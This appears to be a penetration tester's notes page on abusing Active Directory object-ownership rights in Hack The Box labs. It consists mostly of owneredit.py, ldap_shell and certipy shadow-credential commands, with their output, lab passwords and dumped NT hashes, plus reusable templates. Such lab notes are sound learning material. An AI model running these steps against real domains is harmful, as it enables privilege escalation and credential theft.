### Group

The computer HAZE-IT-BACKUP$@HAZE.HTB has the ability to modify the owner of the group SUPPORT_SERVICES@HAZE.HTB.

Object owners retain the ability to modify object security descriptors, regardless of permissions on the object's DACL.

![[Pasted image 20250619201621.png]]

```bash
garffff@garffff:~$ owneredit.py 'haze.htb/haze-IT-backup$' -hashes :4de830d1d58c14e241aff55f82ecdba1 -action write -new-owner 'haze-IT-backup$' -target-dn 'CN=SUPPORT_SERVICES,CN=USERS,DC=HAZE,DC=HTB' 

Impacket for Exegol - v0.10.1.dev1+20231106.134307.9aa93730 - Copyright 2022 Fortra - forked by ThePorgs

[*] Current owner information below
[*] - SID: S-1-5-21-323145914-28650650-2368316563-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=haze,DC=htb
[*] OwnerSid modified successfully!
```

### LDAP_Shell

If `owneredit.py` gives issues, ldap_shell works well:

```bash
ldap_shell certified.htb/judith.mader:judith09
[INFO] Starting interactive shell
judith.mader# set_owner management judith.mader
[INFO] Found Target DN: CN=Management,CN=Users,DC=certified,DC=htb
[INFO] Target SID: S-1-5-21-729746778-2675978091-3820388244-1104
[INFO] Found Grantee DN: CN=Judith Mader,CN=Users,DC=certified,DC=htb
[INFO] Grantee SID: S-1-5-21-729746778-2675978091-3820388244-1103
[INFO] DACL modified successfully! judith.mader now Owner of management!
```

 User has ownership over group:

![[Pasted image 20241105011745.png]]
### Summary
#### owneredit.py

```bash
owneredit.py -action write -owner '<username>' -target '<target>' '<domain>'/'<username>':'<password>'
```

#### ldap_shell

```bash
ldap_shell <domain>/<username>:<password>
set_owner <target> <target_user>
```

### User

The user SAM@TOMBWATCHER.HTB has the ability to modify the owner of the user JOHN@TOMBWATCHER.HTB.

Object owners retain the ability to modify object security descriptors, regardless of permissions on the object's DACL.

![[Pasted image 20250609012535.png]]

```bash
ldap_shell tombwatcher.htb/sam:Password123
[INFO] Starting interactive shell
 
sam# set_owner john sam
[INFO] Found Target DN: CN=john,CN=Users,DC=tombwatcher,DC=htb
[INFO] Target SID: S-1-5-21-1392491010-1358638721-2126982587-1106
[INFO] Found Grantee DN: CN=sam,CN=Users,DC=tombwatcher,DC=htb
[INFO] Grantee SID: S-1-5-21-1392491010-1358638721-2126982587-1105
[INFO] DACL modified successfully! sam now Owner of john!
 
sam# set_genericall john sam
[INFO] Found Target DN: CN=john,CN=Users,DC=tombwatcher,DC=htb
[INFO] Target SID: S-1-5-21-1392491010-1358638721-2126982587-1106
[INFO] Found Grantee DN: CN=sam,CN=Users,DC=tombwatcher,DC=htb
[INFO] Grantee SID: S-1-5-21-1392491010-1358638721-2126982587-1105
[INFO] DACL modified successfully! sam now has control of john
 
certipy shadow auto -u sam@tombwatcher.htb -p Password123 -account john
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'john'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '6624f4d0-d5c5-3194-63b0-2d547323fe2f'
[*] Adding Key Credential with device ID '6624f4d0-d5c5-3194-63b0-2d547323fe2f' to the Key Credentials for 'john'
[*] Successfully added Key Credential with device ID '6624f4d0-d5c5-3194-63b0-2d547323fe2f' to the Key Credentials for 'john'
[*] Authenticating as 'john' with the certificate
[*] Using principal: john@tombwatcher.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'john.ccache'
[*] Trying to retrieve NT hash for 'john'
[*] Restoring the old Key Credentials for 'john'
[*] Successfully restored the old Key Credentials for 'john'
[*] NT hash for 'john': ad9324754583e3e42b55aad4d3b8d2bf
```